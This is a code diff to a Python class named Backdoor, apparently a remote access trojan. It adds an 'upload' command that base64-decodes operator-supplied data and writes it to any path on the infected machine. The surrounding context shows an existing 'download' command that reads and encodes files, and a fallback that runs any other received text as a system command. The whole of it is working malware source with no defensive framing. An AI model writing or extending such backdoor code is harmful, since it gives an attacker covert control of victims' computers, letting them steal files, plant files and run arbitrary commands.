@@ -35,6 +35,13 @@ class Backdoor:
         except:
             return f"[-] No such file or directory: '{path}'"
         
+    
+    def write_file(self, path, content):
+        content = base64.b64decode(content)
+        with open(path, "wb") as file:
+            file.write(content)
+            print("[+] Upload succsessful")
+
     def read_file(self, path):
         file = open(path, "rb").read()
         file = base64.encodebytes(file).decode('utf-8')
@@ -50,6 +57,8 @@ class Backdoor:
                 command_result = self.change_working_directory_to(command.split()[1])
             elif command.split()[0] == "download":
                 command_result = self.read_file(command.split()[1])
+            elif command.split()[0] == "upload":
+                command_result = self.write_file(command.split()[1], command.split()[2])
             else:
                 command_result = self.execute_system_command(command)          
             
